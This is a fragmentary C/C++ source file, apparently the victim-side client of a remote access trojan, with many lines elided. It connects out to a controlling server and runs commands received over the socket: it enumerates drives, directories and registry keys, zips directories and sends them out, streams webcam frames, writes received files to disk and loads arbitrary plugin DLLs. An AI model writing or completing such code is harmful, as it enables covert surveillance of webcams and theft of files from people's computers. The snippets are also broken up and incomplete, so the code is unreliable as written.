...
// ... (Existing RecvFileToDisk, SendFileFromDisk, GetFileSizeOnDisk remain unchanged) ...
...
void LoadAndExecutePlugin(const char* dllPath) {
    ...
    if (hPlugin) {
        ...
        } else SendStatus("Plugin Loaded, but lspInitialize export not found.");
    } else SendStatus("Failed to Load Plugin DLL.");
}
...
void HandleGetRegistry(const char* fullPath) {
    // 2MB Buffer to handle extremely large registry nodes (like HKCR)
    char* resultBuf = (char*)malloc(1024 * 1024 * 2);
    resultBuf[0] = '\0';

    if (strlen(fullPath) == 0) {
        // Send root hives if path is empty
        strcpy(resultBuf, "KEY|HKEY_CLASSES_ROOT\nKEY|HKEY_CURRENT_USER\nKEY|HKEY_LOCAL_MACHINE\nKEY|HKEY_USERS\nKEY|HKEY_CURRENT_CONFIG\n");
    } else {
        char pathCopy[MAX_PATH];
        strcpy(pathCopy, fullPath);
        
        char* rootStr = strtok(pathCopy, "\\");
        char* subKeyStr = strtok(NULL, ""); 

        HKEY hRoot = GetRootKey(rootStr);
        HKEY hKey;
        ...
        if (hRoot && RegOpenKeyExA(hRoot, subKeyStr ? subKeyStr : "", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            ...
            while (true) {
                ...
                if (type == REG_SZ || type == REG_EXPAND_SZ) {
                    strcpy(typeStr, "REG_SZ");
                    snprintf(dataStr, 1023, "%s", dataBuf);
                } else if (type == REG_DWORD) {
                    strcpy(typeStr, "REG_DWORD");
                    snprintf(dataStr, 1023, "0x%08X", *(DWORD*)dataBuf);
                } else {
                    strcpy(typeStr, "BINARY");
                    strcpy(dataStr, "[Binary Data]");
                }

                char entry[2048];
                sprintf(entry, "VAL|%s|%s|%s\n", nameBuf[0] == '\0' ? "(Default)" : nameBuf, typeStr, dataStr);
                if (strlen(resultBuf) + strlen(entry) < (1024 * 1024 * 2) - 100) strcat(resultBuf, entry);
                i++;
            }
            RegCloseKey(hKey);
    ...
    EnterCriticalSection(&sendCS);
    BYTE cmd = 0x41; // Registry Response
...
DWORD WINAPI StreamCamThread(LPVOID lpParam) {
    ...
    if (FAILED(ppDevices[currentCamIndex]->ActivateObject(IID_PPV_ARGS(&pSource)))) {
        ...
        CoTaskMemFree(ppDevices); pConfig->Release(); CoUninitialize(); return 0;
    }
            ...
            if (cbData >= width * height * 4) {
                ...
                if (bmp->GetLastStatus() == Ok) {
                    ...
                    if (imgSize > 0) {
                        ...
                        EnterCriticalSection(&sendCS);
                        BYTE cmd = 0x04; send(currentSock, (char*)&cmd, 1, 0); send(currentSock, (char*)&imgSize, 4, 0);
                        SendAll(currentSock, (char*)imgData, imgSize);
                        LeaveCriticalSection(&sendCS); free(imgData);
                    }
                    pStream->Release(); 
    ...
    while (true) {
        ...
        if (connect(currentSock, (struct sockaddr*)&server, sizeof(server)) == 0) {
            ...
            while (recv(currentSock, (char*)&cmd, 1, 0) > 0) {
                ...
                // --- File & Reg System Logic ---
                else if (cmd == 0x20) { HandleGetDrives(); }
                else if (cmd == 0x40) { // Registry Path Request
                    DWORD len = 0;
                    ...
                    if (recv(currentSock, (char*)&len, 4, 0) == 4 && len > 0 && len < MAX_PATH) {
                        ...
                        if (cmd == 0x21) HandleGetDirectory(path);
                            ...
                            if (fSize > 0) {
                                ...
                                EnterCriticalSection(&sendCS);
                                BYTE outCmd = 0x25; 
                                send(currentSock, (char*)&outCmd, 1, 0); send(currentSock, (char*)&nameLen, 4, 0); send(currentSock, justName, nameLen, 0);
                                send(currentSock, (char*)&fSize, 4, 0); SendFileFromDisk(currentSock, path); 
                                LeaveCriticalSection(&sendCS);
                            }
                        }
                        
                        else if (cmd == 0x27) {
                            char zipPath[MAX_PATH]; GetTempPathA(MAX_PATH, zipPath); strcat(zipPath, "remote_dir_export.zip");
                            DeleteFileA(zipPath); 
                            ...
                            if (fSize > 0) {
                                const char* justName = strrchr(path, '\\'); justName = justName ? justName + 1 : path;
                                char finalZipName[MAX_PATH]; sprintf(finalZipName, "%s.zip", justName);
                                DWORD nameLen = (DWORD)strlen(finalZipName);
                                EnterCriticalSection(&sendCS);
                                BYTE outCmd = 0x25; 
                                send(currentSock, (char*)&outCmd, 1, 0); send(currentSock, (char*)&nameLen, 4, 0); send(currentSock, finalZipName, nameLen, 0);
                                send(currentSock, (char*)&fSize, 4, 0); SendFileFromDisk(currentSock, zipPath);
                                LeaveCriticalSection(&sendCS);
                                DeleteFileA(zipPath); 
                            }
                        }
                    ...
                    if (recv(currentSock, (char*)&pathLen, 4, 0) == 4 && pathLen > 0 && pathLen < MAX_PATH) {
                        ...
                        recv(currentSock, destPath, pathLen, 0); destPath[pathLen] = '\0';
